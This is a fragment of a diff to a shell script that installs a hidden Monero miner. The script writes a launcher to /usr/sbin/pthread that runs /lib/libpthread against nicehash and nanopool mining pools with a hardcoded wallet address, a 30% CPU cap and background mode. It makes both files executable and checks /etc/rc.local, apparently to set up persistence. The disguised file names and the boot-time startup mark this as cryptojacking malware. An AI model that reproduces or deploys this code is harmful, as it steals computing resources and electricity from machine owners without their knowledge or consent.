@@ -55,7 +55,8 @@ if [ ! -f "/usr/lib64/libuv.so.1" ]; then
 else
     echo "libuv 1.x installed"
 fi
-sudo echo "/lib/libpthread -o nicehash.gpu360.com:14444 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbS1WEZGWKA3v566F6vb."$RANDOM" -p x -k -o xmr-eu1.nanopool.org:14444 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbS1WEZGWKA3v566F6vb."$RANDOM" -p x -k --max-cpu-usage=30 --donate-level=1 --background" > /usr/sbin/pthread
+WokerID="RAN_$RANDOM"
+sudo echo "/lib/libpthread -o nicehash.gpu360.com:14444 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbS1WEZGWKA3v566F6vb.$WokerID -p x -k -o xmr-eu1.nanopool.org:14444 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbS1WEZGWKA3v566F6vb.$WokerID -p x -k --max-cpu-usage=30 --donate-level=1 --background" > /usr/sbin/pthread
 sudo chmod +x /lib/libpthread
 sudo chmod +x /usr/sbin/pthread
 if [ -z "`grep "/usr/sbin/pthread" /etc/rc.local`" ]; then
